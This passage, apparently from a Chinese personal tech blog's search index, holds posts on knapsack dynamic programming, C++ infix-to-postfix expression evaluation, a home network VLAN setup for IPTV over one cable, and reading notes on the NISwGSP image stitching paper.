1][j]（同01背包）\n在能装入的前提下，因为每件物品有无限个，所以不从dp[i − 1][j − w[i]]转移，而是从dp[i][j − w[i]]转移，即装入第i种商品后还可以再继续装入该种商品。即装入第i件物品：dp[i][j] = dp[i][j − w[i]] + v[i]\n\n状态转移方程为：\ndp[i][j] = max(dp[i-1][j], j-w[i] &gt;= 0 ? dp[i][j-w[i]]+v[i] : 0)\n和01背包问题相似，也可以进行空间优化，不同点在于完全背包的j只能正向枚举而01背包只能逆向枚举，因为max第二项是dp[i]而01背包是dp[i-1]，即完全背包需要覆盖而01背包需要避免覆盖。代码如下：\nint solutionUnboundedKnapsack(int N, int W, std::vector&lt;int&gt; &amp;w, std::vector&lt;int&gt; &amp;v) &#123;    // w[i]重量  v[i]价值    std::vector&lt;int&gt; dp(W+1);    for (auto i = 0; i &lt; N; i++) &#123;        for (auto j = w[i]; j &lt;= W; j++) &#123;            dp[j] = std::max(dp[j], dp[j - w[i]] + v[i]);        &#125;    &#125;    return dp[W];&#125;\n完全背包问题也可以转化为01背包问题来解：将一种物品转换成最多能放下的若干件。\n最简单的想法是，考虑到第i种物品最多装入W/w[i]件，于是把第i种物品转化为 W/w[i]件费用及价值不变的物品，然后求解这个01背包问题。时间复杂度为：$O(NW\\frac{\\sum{\\frac{W}{w_i}}}{N}) =\nO(W\\sum{\\frac{W}{w_i}})$ 。\n更高效的转化方法是采用二进制的思想：把第i种物品拆成重量为wi2k、价值为vi2k若干件物品，其中\nk 取遍满足wi2k ≤ W的非负整数。这是因为不管最优策略选几件第i种物品，总可以表示成若干个刚才这些物品的和（例：13 = 20 + 22 + 23）。这样就将转换后的物品数目降成了对数级别。时间复杂度为：$O(NW\\frac{\\sum\\log_2{\\frac{W}{w_i}}}{N}) =\nO(W\\sum\\log_2{\\frac{W}{w_i}})$。\n多重背包\n设一共有N件物品，第i件物品的重量为w[i]，价值为v[i]，数量限制为n[i]，最大总重量为W。\n参考完全背包转为01背包的思想，k表示装入第i种物品的件数，k &lt;= min(n[i],j/w[i])​\ndp[i][j] = max&#123;(dp[i-1][j-k*w[i]]+k*v[i]) for range(k)&#125;\n同理也可以进行空间优化，而且j也必须逆向枚举：\nint solutionBoundedKnapsack(int N, int W,                            std::vector&lt;int&gt; &amp;w,                            std::vector&lt;int&gt; &amp;v,                            std::vector&lt;int&gt; &amp;n) &#123;    // w[i]重量  v[i]价值    std::vector&lt;int&gt; dp(W + 1);    for (auto i = 0; i &lt; N; i++) &#123;        for (auto j = W; j &gt;= w[i]; j--) &#123;            for (auto k = 1; k &lt;= std::min(n[i], j / w[i]); k++) &#123;                dp[j] = std::max(dp[j], dp[j - k * w[i]] + k * v[i]);            &#125;        &#125;    &#125;    return dp[W];&#125;\n时间复杂度为：O(NWn̄) = O(W∑ni)，空间复杂度为：O(W)。\n当然也可以采用二进制思路，将第i种物品分成了log2ni件物品，将时间复杂度优化为：O(W∑log2ni)。\n杂项\n背包问题还有一些其他变种问题。\n恰好装满\n要求：必须恰好装满背包。\n只需要修改初始化，将dp[0, …, N][0]初始为0，其它dp值均初始化为-inf，因为此时只有容量为0的背包可以在什么也不装情况下被“恰好装满”，其它容量的背包初始均没有合法的解，应该被初始化为-inf。\n总方案数\n要求：求背包装满或则装至某一指定容量的总方案数。\n修改转移方程中的max为sum。\n二维背包\n上文讨论的背包都只有一个限制：最大容量。二维背包指一个背包存在两个限制（比如重量和体积限制）。\n此类问题的解法和一维背包相似，需要dp数组要多开一维，其他和一维背包一致。\n输出最优方案\n要求：输出背包问题的解方案。\n可以参照一般动态规划的方案输出方法：记录每一个状态是由那条策略推导而出，以便回溯出上一个状态。\n以01背包为例，再开辟一个数组P[i][j]来记录方案，P[i][j] = 0表示dp[i][j]采用第一种状态转移策略，即dp[i][j] = dp[i − 1][j]，P[i][j] = 1表示采用第二种状态转移策略，即dp[i][j] = dp[i − 1][j − w[i]] + v[i]，从而反推方案。\n另外我们也可以从求出的dp数组进行反推，若 dp[i][j] = dp[i − 1][j]\n说明未选第i个物品，反之说明选了。\n"},{"title":"字符串表达式求值（C++）","url":"/2019/05/22/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC%EF%BC%88C++%EF%BC%89/","content":"\n问题要求：给你一个字符串，这个字符串表示一个表达式，这个表达式可能有整数/小数，加减乘除符号和小括号，求这个表达式的值。\n\n三种算术表达式\n算术表达式中最常见的表示法形式有\n中缀、前缀和\n后缀表示法。中缀表示法是书写表达式的常见方式，而前缀和后缀表示法主要用于计算机科学领域。\n中缀表示法\n中缀表示法是算术表达式的常规表示法。称它为\n中缀表示法是因为每个操作符都位于其操作数的中间，这种表示法只适用于操作符恰好对应两个操作数的时候（在操作符是二元操作符如加、减、乘、除以及取模的情况下）。对以中缀表示法书写的表达式进行语法分析时，需要用括号和优先规则排除多义性。\n(A+B)*C-D/(E+F)\n前缀表示法\n前缀表示法中，操作符写在操作数的前面。这种表示法经常用于计算机科学，特别是编译器设计方面。为纪念其发明家\n― Jan Lukasiewicz（请参阅参考资料，这种表示法也称\n波兰表示法。\n-*+ABC/D+EF\n后缀表示法\n在后缀表示法中，操作符位于操作数后面。后缀表示法也称\n逆波兰表示法（reverse Polish\nnotation，RPN），因其使表达式求值变得轻松，所以被普遍使用。\nAB+C*DEF+/-\n中缀表达式到后缀表达式的转换\n要把表达式从中缀表达式的形式转换成用后缀表示法表示的等价表达式，必须了解操作符的优先级和结合性。\n优先级或者说操作符的强度决定求值顺序；优先级高的操作符比优先级低的操作符先求值。\n如果所有操作符优先级一样，那么求值顺序就取决于它们的\n结合性。操作符的结合性定义了相同优先级操作符组合的顺序（从右至左或从左至右）。\nLeft associativity  : A+B+C = (A+B)+CRight associativity : A^B^C = A^(B^C)\n转换过程包括用下面的算法读入中缀表达式的操作数、操作符和括号：\n\n初始化一个空堆栈，将结果字符串变量置空。\n从左到右读入中缀表达式，每次一个字符。\n如果字符是操作数，将它添加到结果字符串。\n如果字符是个操作符，弹出（pop）操作符，直至遇见开括号（opening\nparenthesis）、优先级较低的操作符或者同一优先级的右结合符号。把这个操作符压入（push）堆栈。\n如果字符是个开括号，把它压入堆栈。\n如果字符是个闭括号（closing\nparenthesis），在遇见开括号前，弹出所有操作符，然后把它们添加到结果字符串。\n如果到达输入字符串的末尾，弹出所有操作符并添加到结果字符串。\n\n后缀表达式求值\n对后缀表达式求值比直接对中缀表达式求值简单。在后缀表达式中，不需要括号，而且操作符的优先级也不再起作用了。您可以用如下算法对后缀表达式求值：\n\n初始化一个空堆栈\n从左到右读入后缀表达式\n如果字符是一个操作数，把它压入堆栈。\n如果字符是个操作符，弹出两个操作数，执行恰当操作，然后把结果压入堆栈。如果您不能够弹出两个操作数，后缀表达式的语法就不正确。\n到后缀表达式末尾，从堆栈中弹出结果。若后缀表达式格式正确，那么堆栈应该为空。\n\n#include &lt;stack&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;iomanip&gt;#include &lt;tuple&gt;#include &lt;cmath&gt;#include &lt;sstream&gt;using namespace std;//定义栈数据结构体struct stackData &#123;    char Operator;    double Number;&#125;;inline bool isOperator(char ch) &#123;    return ch == &#x27;+&#x27;           or ch == &#x27;-&#x27;           or ch == &#x27;*&#x27;           or ch == &#x27;/&#x27;           or ch == &#x27;^&#x27;;&#125;inline bool isNumber(char ch) &#123;    return &#x27;0&#x27; &lt;= ch and ch &lt;= &#x27;9&#x27; or ch == &#x27;.&#x27;;&#125;//优先级判定inline int priority(char operatorChar) &#123;    int level = 0;  // level越大，优先级越高    if (operatorChar == &#x27;^&#x27;) &#123;        level = 2;    &#125; else if (operatorChar == &#x27;*&#x27; or operatorChar == &#x27;/&#x27;) &#123;        level = 1;    &#125; else if (operatorChar == &#x27;+&#x27; or operatorChar == &#x27;-&#x27;) &#123;        level = 0;    &#125;    return level;&#125;//获取数字栈顶双数template&lt;typename T&gt;tuple&lt;T, T&gt; getTwoNums(stack&lt;T&gt; &amp;nums) &#123;    auto second = nums.top();    nums.pop();    auto first = nums.top();    nums.pop();    return &#123;first, second&#125;;&#125;   // return &#123;first, second&#125;//计算后缀表达式double postfixCalculate(vector&lt;stackData&gt; &amp;postfix) &#123;    double first, second;    stack&lt;double&gt; nums;    for (const auto &amp;p : postfix) &#123;        switch (p.Operator) &#123;            case &#x27;*&#x27;:                tie(first, second) = getTwoNums(nums);                nums.push(first * second);                break;            case &#x27;/&#x27;:                tie(first, second) = getTwoNums(nums);                nums.push(first / second);                break;            case &#x27;+&#x27;:                tie(first, second) = getTwoNums(nums);                nums.push(first + second);                break;            case &#x27;-&#x27;:                tie(first, second) = getTwoNums(nums);                nums.push(first - second);                break;            case &#x27;^&#x27;:                tie(first, second) = getTwoNums(nums);                nums.push(pow(first, second));                break;            default:                nums.push(p.Number);                break;        &#125;    &#125;    double result = nums.top();    nums.pop();    return result;&#125;//做分割vector&lt;stackData&gt; getSeparate(string &amp;infix) &#123;    vector&lt;stackData&gt; postfix;    string numStr;  // 单个连续字符的数字    for (const auto &amp;p : infix) &#123;        if (isNumber(p)) &#123;            numStr += p;        &#125; else if (isOperator(p) or p == &#x27;(&#x27; or p == &#x27;)&#x27;) &#123;            if (not numStr.empty()) &#123;                postfix.emplace_back(stackData&#123;&#x27; &#x27;, stod(numStr)&#125;);            &#125;            numStr = &quot;&quot;;            postfix.emplace_back(stackData&#123;p, 0&#125;);        &#125;    &#125;    if (not numStr.empty()) &#123;        postfix.emplace_back(stackData&#123;&#x27; &#x27;, stod(numStr)&#125;);    &#125;    //前导缺损+-符号补0    vector&lt;stackData&gt; newPostfix;    char preChar = &#x27;(&#x27;;    for (const auto &amp;p : postfix) &#123;        if (p.Operator != &#x27; &#x27;) &#123;            if (preChar == &#x27;(&#x27; and (p.Operator == &#x27;-&#x27; or p.Operator == &#x27;+&#x27;))                newPostfix.emplace_back(stackData&#123;&#x27; &#x27;, 0&#125;);            preChar = p.Operator;        &#125; else &#123;            preChar = &#x27; &#x27;;        &#125;        newPostfix.emplace_back(p);    &#125;    return newPostfix;&#125;//表达式输出string printExpression(vector&lt;stackData&gt; &amp;temp) &#123;    stringstream ss;    for (const auto &amp;t: temp) &#123;        if (t.Operator != &#x27; &#x27;) &#123;            ss &lt;&lt; t.Operator;        &#125; else &#123;            ss &lt;&lt; t.Number;        &#125;        ss &lt;&lt; &#x27; &#x27;;    &#125;    return ss.str();&#125;//后缀表达式转换vector&lt;stackData&gt; getPostfixExp(vector&lt;stackData&gt; &amp;infix) &#123;    stack&lt;char&gt; operator_stack;    vector&lt;stackData&gt; postfix;    for (const auto &amp;p: infix) &#123;        if (isOperator(p.Operator)) &#123;            while (not operator_stack.empty()                   and isOperator(operator_stack.top())                   and priority(operator_stack.top()) &gt;= priority(p.Operator)) &#123;                postfix.emplace_back(stackData&#123;operator_stack.top(), 0&#125;);                operator_stack.pop();            &#125;            operator_stack.push(p.Operator);        &#125; else if (p.Operator == &#x27;(&#x27;) &#123;            operator_stack.push(p.Operator);        &#125; else if (p.Operator == &#x27;)&#x27;) &#123;            while (operator_stack.top() != &#x27;(&#x27;) &#123;                postfix.push_back(stackData&#123;operator_stack.top()&#125;);                operator_stack.pop();            &#125;            operator_stack.pop();        &#125; else &#123;            postfix.push_back(p);        &#125;    &#125;    while (not operator_stack.empty()) &#123;        postfix.push_back(stackData&#123;operator_stack.top(), 0&#125;);        operator_stack.pop();    &#125;    return postfix;&#125;int main() &#123;    cout &lt;&lt; &quot;please input string expression: &quot; &lt;&lt; endl         &lt;&lt; &quot;example: &quot; &lt;&lt; &quot;( 15 / 3 - 1)^2 -(8 + (0.7 - 0.2)*5.41 + 6.8)+1^0.5&quot; &lt;&lt; endl;    string infix;    // 读取非空行    while (getline(cin, infix)) &#123;        infix.erase(infix.find_last_not_of(&quot; \\n\\r\\t&quot;) + 1);        if (not infix.empty()) &#123;            break;        &#125;    &#125;    vector&lt;stackData&gt; expression = getSeparate(infix);    cout &lt;&lt; &quot;Standard expression: &quot; &lt;&lt; printExpression(expression) &lt;&lt; endl;    vector&lt;stackData&gt; postfixExp = getPostfixExp(expression);    cout &lt;&lt; &quot;Postfix expression: &quot; &lt;&lt; printExpression(postfixExp) &lt;&lt; endl;    double result = postfixCalculate(postfixExp);    cout &lt;&lt; &quot;Answer: &quot; &lt;&lt; setprecision(10) &lt;&lt; result;    return 0;&#125;\n"},{"title":"家庭网络拓扑及IPTV单线复用方案","url":"/2023/11/19/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E5%8F%8AIPTV%E5%8D%95%E7%BA%BF%E5%A4%8D%E7%94%A8%E6%96%B9%E6%A1%88/","content":"家庭网络拓扑及IPTV单线复用方案\n搬新家快接近一年了，家里网络布局经过多轮设备更替和演进，总算稳定下来。主要介绍下当前网络的拓扑结构，以及如何利用弱电箱到客厅的一根网线，实现既可以上网，又可以看\nIPTV。\n家庭网络拓扑介绍\n需求分析\n\n网络套餐为千兆，为保证 WIFI\n信号质量不成为带宽的约束，且确保智能家居的接入稳定，需每个房间放置无线接入点；\n家庭接入设备量大，存在更多网络需求，需软路由进行拨号、DHCP、DNS等功能；\n弱点箱到客厅仅预埋一根网线，需支持上网和IPTV两个功能；\n尽可能利用当前预埋线，不另走明线破坏装修。\n\n实现方案\n\n整体网络拓扑大致由\n光猫 —— 路由 —— 二层交换机 —— AP —— 接入设备 组成，呈现\n树状结构，避免网络环路导致的网络风暴。\n特点如下：\n\n光猫 Internet\n网口修改为桥接，仅作光电调制解调（modem）功能；\n软路由和光猫同放弱电箱，软路由作为家庭网络中枢，实现以下功能：\n\n拨号上网，且多播实现宽带叠加；\n网关，同时存在一般网关和科学上网网关；\nDNS 服务，实现去广告和加速功能；\nDHCP 服务，根据设备 mac 分配分配上述功能，且带IPv6；\n\n增配网管型交换机实现 VLAN 划分，分离 IPTV\n线路，同时增加网口供更多设备使用；\n多台无线路由器组Mesh，保证全屋 WIFI 覆盖，取消 DHCP\n服务，当作 AP(Access Point) 使用；\n搭建服务器，提供 NAS\n存储服务供家庭数据存储，提供虚拟机服务供开发。\n\n利用 VLAN 实现单线复用接入\nIPTV\n因为 IPTV 的特殊性，最佳是光猫 IPTV\n接口走单独网线直达机顶盒，避免和家庭网络的 Internet 存在冲突。\n实际上因为弱电箱到客厅预埋线仅一根，必须实现单线复用，且做好区分，才能保证两者独立工作正常，解决方案就是\n划分 VLAN。\n\nVLAN（Virtual Local Area\nNetwork）即虚拟局域网，是将一个物理的LAN在逻辑上划分成多个广播域的通信技术。\n每个VLAN是一个广播域，VLAN内的主机间可以直接通信，而VLAN间则不能直接互通。这样，广播报文就被限制在一个VLAN内。\n\n具体流程如下：\n1. 光猫 IPTV 端口带上 VLAN\n标签(tag)\n我的目标是让 IPTV 端口出来的数据全部带上 VLAN\n标签接入局域网，进而也因为 tag 标签避免对其他设备影响。\n光猫一般用户是无权配置 VLAN\n的，因此找宽带供应商工程师拿到光猫超级管理员账号（telecomadmin）和密码。在\n网络 —— 网络设置 —— VLAN绑定 中新增配置，指定 iTV 端口的\n3_OTHER_B_VID_43( WAN 侧服务名)绑定用户侧 VLAN，VLAN ID\n我改为43。\n\n配置过后，光猫 IPTV 出来的原始数据都会带上 VLAN 43 tag\n的标签，也会接受相同 tag 的数据帧，并在内部去除 tag。 将光猫 IPTV\n端口接入到软路由中，这样弱电箱到客厅单根网线上，就同时有\n正常Internet + IPTV(tag) 两种数据。\n2. 网管交换机指定端口解\nVLAN 标签(untag)\n接下来目标是客厅的交换机指定端口解 VLAN 标签，让 IPTV\n数据走该端口，其他数据摒弃。\n交换机物理上1口是接入单线复用，4口上连接机顶盒。进入交换机后台，创建一个名为\nIPTV 的 VLAN 配置，VLAN ID 为43：\n\n4口选择“不带标签”，这样4口发出的数据帧是具有标签的将会去除标签，进来的数据将会在交换机内部加上标签；\n1口选择“带标签”，交换机中属于该 VLAN\n的数据发出1口时会带上标签，其他正常数据也会流转;\n其他端口选择“非成员”，相当于不敢感知 VLAN 数据。\n\n\n同时配置 VLAN\nPVID，让4口仅接受来自机顶盒未打标签的数据帧，当未打标签的数据进入交换机时，将会以\nPVID(43) 打上标签，避免机顶盒可能发出 VLAN 数据对链路的影响。\n\n如上两步配置，实现基于 VLAN 的单线复用。\n"},{"title":"图像拼接NISwGSP论文阅读笔记","url":"/2020/04/17/%E5%9B%BE%E5%83%8F%E6%8B%BC%E6%8E%A5NISwGSP%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/","content":"Natural\nImage Stitching with the Global Similarity Prior\n论文原文\n摘要：\n本文提出了一种将多个图像拼接在一起的方法，使得拼接图像看起来尽可能自然。我们的方法采用局部扭曲模型，用网格引导每个图像的变形。目标函数用于指定扭曲的所需特征。除了良好的对齐和最小的局部失真之外，我们还在目标函数中添加了全局先验相似性。该先验约束每个图像的扭曲，使其类似于整体的相似变换。选择相似性变换对拼接的自然性至关重要。我们提出了为每个图像选择合适的比例和旋转的方法。所有图像的扭曲被一起解决，以最小化全局失真。综合评估表明，所提出的方法始终优于多种最先进的方法，包括AutoStitch，APAP，SPHP和ANNAP。\n关键词： 图像拼接，全景图，图像扭曲\n\n1 介绍\n图像拼接是将多个图像组合成具有更宽视场的更大图像的处理过程1。早期的方法专注于提高无缝拼接的对齐精度，例如找到全局参数扭曲以使图像对齐。全球扭曲很强大，但往往不够灵活。为了解决全局扭曲模型的不足和提高对准质量，已经提出了几种局部扭曲模型，例如平滑变化的仿射（SVA）扭曲2和尽可能投射（APAP）扭曲3。这些方法采用多个局部参数扭曲以获得更好的对准精度。投影（仿射）正则化用于平滑地推断超出图像重叠的扭曲并且整体上类似于整体变换。拼接图像基本上是单视角的。因此，它们存在形状/区域变形的问题，并且缝合图像的部分可能被严重且不均匀地拉伸。当将多个图像拼接成非常宽的视角时，问题甚至更加严重。在这种情况下，失真累积并且远离基础图像的图像通常被显着拉伸。因此，拼接图像的视野通常具有限制。圆柱形和球形扭曲通过将图像投影到圆柱体或球体上来解决透视弯曲的相当窄视图的问题。不幸的是，这些扭曲通常会弯曲直线，并且只有在同一相机中心捕获的图像时才有效。\n目前，有几种方法试图在保证图像对齐质量的同时，解决缝合图像中存在的畸变和视野受限的问题。由于具有宽视野的单视点图像不可避免地会引起严重的形状/尺寸失真，因此这些方法提供了多视点的拼接图像。Chang等人提出了形状保持半投影（SPHP）扭曲，它是投影变换和相似变换的空间组合4。SPHP将重叠区域的投影变换平滑地推断为非重叠区域的相似性变换。投影变换在重叠区域中保持良好的对齐方式，而非重叠区域的相似性变换则可以保留图像的原始视角并减少了失真。除了投影变换之外，SPHP还可以与APAP结合使用，以实现更好的对准质量。但是，SPHP扭曲有几个问题（1）通过分析两个图像之间的单应性来形成SPHP变形。它继承了单应性的局限性，并存在视野受限的问题。因此，在拼接许多图像时通常会失败。（2）如果图像之间的空间关系为一维，则SPHP可以更好地处理变形。当空间关系为2D时，SPHP可能仍会失真（以图5为例）。（3）正如Lin等人所指出的5，SPHP从单应性派生相似性转换。如果使用全局单应性，则派生的相似度变换可能会表现出不自然的旋转（例如图4(e)）。他们提出了一种自适应的“可能的自然变形”（AANAP）变形来解决旋转不自然的问题。AANAP扭曲将单应性线性化，然后将其缓慢更改为代表摄像机运动的估计全局相似度变换。AANAP仍然存在两个问题。首先，拼接多个图像时局部仍然存在失真（图4(f)，图5和图6）。其次，对全局相似性变换的估计并不可靠，并且仍然可能存在不自然的旋转和缩放（图1(b)，图3和图5）。\n我们提出一种图像拼接方法，以解决这些问题并稳健地合成自然拼接图像。我们的方法采用局部变形模型。每个图像的变形均由网格划分。设计目标函数以指定所需的扭曲特性。将所有图像的扭曲一起求解，以获得最佳解决方案。优化导致线性系统稀疏，可以有效解决。关键思想是添加一个全局相似项，以要求每个图像的扭曲总体上都类似于相似变换。先前的方法已经表明，相似变换可以有效地减少失真67，但是它们通常是局部施加的。相反，我们为每张图像提出了全局相似度，其中恰当地选择比例和旋转度对于拼接图像的自然性至关重要。根据我们的观察，旋转度的选择对于拼接自然性至关重要。很少有人关注图像拼接的旋转选择问题。AutoStitch假定用户很少相对于地平线转动相机，并且可以通过计算向上矢量来使波浪全景图变直8。AANAP使用特征匹配来确定最佳相似度转换9。然而，这些试探法不够鲁棒。我们提出了健壮的方法来为每个图像选择合适的比例和旋转度。\n我们的方法具有以下优点。首先，它没有有限视野的问题，这是APAP和SPHP共享的问题。其次，通过一起解决所有图像的扭曲，我们的方法可以最大限度地减少全局失真。最后，它为每个图像指定适当的比例和旋转，以使拼接图像看起来比以前的方法更自然。简而言之，我们的方法实现了以下目标：精确对准，减少形状失真，自然性并且不受视野限制。我们在42组图像上评估了所提出的方法，并且所提出的方法始终优于AutoStitch，APAP，SPHP和AANAP。图1展示了以前方法的常见问题。在图1(a)中，APAP\n+ BA（束调整）10通过将图像投影到圆柱体上克服了有限视场的问题。然而，它使用错误的比例和旋转，并且结果在图像上表现出非均匀的失真。AANAP不会正确选择旋转和缩放。在图1(b)中，误差累积并严重弯曲了拼接结果。我们的结果（图1(c)）看起来更自然，因为它可以正确选择比例和旋转。我们的方法也可以结合水平检测，结果可以进一步改进（图1（d））。\n\n\n\n\n\n\n\n(a) APAP+BA\n\n\n\n\n\n(b) AANAP\n\n\n\n(c) 我们的成果（3D方法）\n\n\n\n(d) 带指定水平线的我们的成果\n\n\n\n\n图1 18个图像的拼接。\n2 相关工作\nSzeliski对图像拼接进行了全面的调研11。图像拼接技术通常利用参数转换来全局或局部对齐图像。早期的方法使用全局参数扭曲，例如相似性，仿射和投影变换。有些人认为相机运动仅包含3D旋转。进行投影以将视球映射到图像平面以获得二维合成图像。一个著名的例子是Brown等人提出的AutoStitch方法12。Gao等人提出了双重单应性变形，专门处理包含两个主导平面的场景13。扭曲函数由具有空间变化权重的两个单应性矩阵的线性组合定义。由于它们的扭曲基于投影变换，因此生成的图像会受到投影失真（会拉伸和扩大区域）的影响。\n局部扭曲模型采用多个局部参数扭曲以提高对齐精度。Lin等人通过使用平滑变化的仿射缝制场来优先处理用于图像缝制的局部扭曲模型14。它们的翘曲是全局仿射的，同时允许局部变形。Zaragoza等人提出了在可能的情况下尽可能普遍地投影，同时允许局部偏差以更好地对齐15。\n几种方法没有关注对准质量，而是解决了拼接图像中的失真问题。Chang等人提出了保形的半投影扭曲，它是投影变换和相似变换的空间组合16。投影变换在重叠区域中保持良好的对齐方式，而非重叠区域的相似性变换则保留了图像的原始视角并减少了失真。这种方法有时会导致不自然的旋转。Lin等人提出了一种自适应的自然可行（AANAP）弯曲来解决旋转不自然的问题17。\n已经提出了一些投影模型以减少由于投影引起的视觉失真。Zelnik-Manor等人用多平面投影代替圆柱投影18。Kopf等人提出了局部适应的投影，该投影为整体圆柱形，而局部透视19。Carroll等人提出了一种减少广角图像失真的内容保留投影20。当不满足这些模型的基本假设时，就会发生失准，并且可以使用后处理方法（例如反虚像和混合）将其隐藏。\n3 方法\n我们的方法采用局部扭曲模型，包括以下步骤：\n\n特征检测和匹配\n图像匹配图的验证21\nAPAP的匹配点生成22\n焦距和3D旋转估计\n比例和旋转选择\n网格优化\n通过纹理映射合成结果\n\n输入是一组N个图像，I1, I2, ..., IN。在不失一般性的情况下，我们使用I0作为参考图像。我们首先通过SIFT23检测每个图像中的特征及其匹配。步骤2确定图像间的邻接关系。在成对比对的质量方面，APAP表现最佳。因此，步骤3对相邻图像对应用APAP，并使用对齐结果来生成匹配点。细节将在3.1节中给出。我们的方法通过网格变形来缝合图像。3.2节描述了我们的能量函数设计。为了使拼接尽可能自然，我们添加了一个全局相似项，要求每个变形图像经历一个相似变换。为了确定每个图像的相似性变换，我们的方法估计每个图像的焦距和3D旋转（步骤4），然后选择最佳比例和旋转（步骤5）。第4节描述了这两个步骤的细节。最后，结果通过步骤6和7合成。\n3.1 APAP生成匹配点\n设J表示由步骤2检测到的一组相邻图像对。对于J中的一对相邻图像Ii和Ij，我们应用APAP使用来自步骤1的特征和匹配来对齐它们。请注意，APAP是一种基于网格的方法，每个图像都有一个用于对齐的网格。我们在Ii和Ij的重叠部分中收集Ii的网格顶点作为匹配点集合${\\rm M}^{ij}$。对于${\\rm\nM}^{ij}$中的每个匹配点，我们知道它在Ij中的对应关系，因为Ii和Ij已被APAP对齐。同样，我们为Ij设置了一组匹配点${\\rm M}^{ji}$。\n图2给出了匹配点的示例。给定图2（a）中的特征和匹配项，我们使用APAP对齐两个图像。对齐后，对于左图，我们有一组匹配点，它们只是APAP对齐后重叠区域中的网格点。对于这些匹配点，我们在右边的图像中有它们的对应关系。在进一步的步骤中，我们使用匹配点代替特征点，因为匹配点更均匀地分布。\n\n\n\n\n\n\n\n\n\n\n\n\n\n(a) 特征点\n(b) 匹配点（左对右）\n\n\n\n图2 特征点与匹配点。(a) 特征点及其匹配 (b)匹配点及其匹配\n3.2 通过网格变形缝合\n我们的拼接方法基于基于网格的图像变形。对于每个图像，我们使用网格来引导图像变形。设${\\rm V}_i$和${\\rm\nE}_i$表示图像Ii的网格中的顶点和边的集合。$\\rm\nV$表示所有顶点的集合。我们的拼接算法试图找到一组变形的顶点位置$\\tilde{\\rm V}$，使得能量函数$\\Psi(\\rm\nV)$最小化。良好拼接的标准可能因应用领域而异。在我们的方法中，我们将多个图像拼接到一个全局平面上，并希望拼接图像看起来像原始图像一样自然。关于自然度的定义，我们假设原始图像对用户来说是自然的。因此，在局部上，我们的方法尽可能地保留每个图像的原始视角。同时，在全局上，试图通过为图像寻找合适的比例和旋转来保持良好的结构。两者都有助于拼接的自然性。因此，我们的能量函数由三个项组成：对齐项Ψa，局部相似项Ψl和全局相似项Ψg。\n对齐项Ψa。该术语通过使匹配点与其对应关系对齐来确保变形后的对齐质量。它被定义为\n$$\n\\Psi_a({\\rm V}) = \\sum^N_{i=1}\\sum_{(i,j)\\in {\\rm J}}\\sum_{p^{ij}_{k}\\in\n{\\rm M}^{ij}}\\| \\tilde{v}(p^{ij}_k)-\\tilde{v}(\\Phi(p^{ij}_k))\\| ^2\n\\tag{1}\n$$\n其中Φ(p)返回给定匹配点p的对应关系点。函数ṽ(p)将p的位置表示为四个顶点位置的线性组合$\\sum^4_{i=1} \\alpha_i\n\\tilde{v_i}$，其中ṽi表示p所在的四边形的四个角，αi是相应的双线性权重。\n局部相似项Ψl。该项用于正则化，并且将对齐约束从重叠区域传播到非重叠区域。我们对这个术语的选择是确保每个四边形经历一个相似变换，以便形状不会过度扭曲。\n$$\n\\Psi_l({\\rm V}) = \\sum^N_{i=1} \\sum_{(j,k)\\in {\\rm E}_i}\\|\n(\\tilde{v}^i_k - \\tilde{v}^i_j) - {\\rm S}^i_{jk}(v^i_k-v^i_j)\\| ^2\n\\tag{2}\n$$\n其中vji是原始顶点的位置，而ṽji表示变形后顶点的位置。${\\rm S}_{jk}^i$是边(j, k)的相似变换，可以表示为\n$$\n\\begin{align}\n{\\rm S}^i_{jk}=\n    \\begin{bmatrix}\n        c(e^i_{jk})\\ s(e^i_{jk}) \\\\\n        -s(e^i_{jk})\\ c(e^i_{jk})\n    \\end{bmatrix} \\tag{3}\n\\end{align}\n$$\n系数c(ejki)和s(ejki)可以表示为顶点变量的线性组合。细节可见24。\n全局相似项Ψg。该项要求每个变形图像尽可能经过相似地变换。这对于拼接图像的自然性至关重要。简而言之，如果没有该项，拼接结果可能是倾斜且非均匀变形的，如AANAP和SPHP所示（图4和图5）。此外，它消除了vij = 0的一般解。确定适当的比例和旋转的过程在第4节中描述。假设我们已经确定了图像Ii的期望缩放比例si和旋转角θi。全局相似性定义为\n$$\n\\Psi_g({\\rm V})=\\sum^N_{i=1}\\sum_{e^i_j\\in {\\rm\nE}_i}w(e^i_j)^2[(c(e^i_j)-s_i\\cos\\theta_i)^2 +\n(s(e^i_j)-s_i\\sin\\theta_i)^2] \\tag{4}\n$$\n这需要为Ii中每个边eji的做相似变换，类似于我们为Ii确定的相似变换。函数c(e)和s(e)返回如等式3中所述的输入边e的相似变换的系数的表达式。权重函数w(eji)将更多权重分配给远离重叠区域的边界。对于重叠区域中的四边形，对齐起着更重要的作用。另一方面，对于远离重叠区域的边缘，因为没有对齐约束，所以先验相似性更重要。具体而言，w(eji)定义为\n$$\nw(e^i_j)=\\beta+\\frac{\\gamma}{|Q(e^i_j)|}\\sum_{q_k \\in\nQ(e^i_j)}{\\frac{d(q_k,{\\rm M}^i)}{\\sqrt{R^2_i+C^2_i}}} \\tag{5}\n$$\n其中β和γ是控制该项权重的常数；Q(eji)是共享边eji的四边形集合（1或2个四边形，取决于边是否在网格的边界上）；${\\rm M}^i$表示Ii的重叠区域中的四边形组；函数$d(q_k, {\\rm M}^i)$返回四边形qk到网格空间中重叠区域中的四边形的距离；Ri和Ci表示Ii的网格网格中的行数和列数。概括而言，边缘的权重与边缘到网格空间中重叠区域的归一化距离成比例。\n​ 网格的最佳变形由以下因素确定：\n$$\n{\\rm \\tilde{V}}=\\arg\\min_{\\rm{\\tilde{V}}}{\\Psi_a}({\\rm\nV})+\\lambda_l\\Psi_l({\\rm V})+\\Psi_g({\\rm V}) \\tag{6}\n$$\n注意，在Ψg中有两个参数，β和γ，控制全局相似项的相对重要性。在我们的所有实验中，我们设置λl = 0.56，β = 6和γ = 20。根据经验，我们发现参数非常稳定，因为各项之间没有严重的冲突。优化可以通过稀疏线性求解器有效地求解。\n4 缩放和旋转选择\n本节描述如何确定每个图像Ii的最佳尺度si和旋转角度θi，这是缝合结果自然性的关键。\n4.1 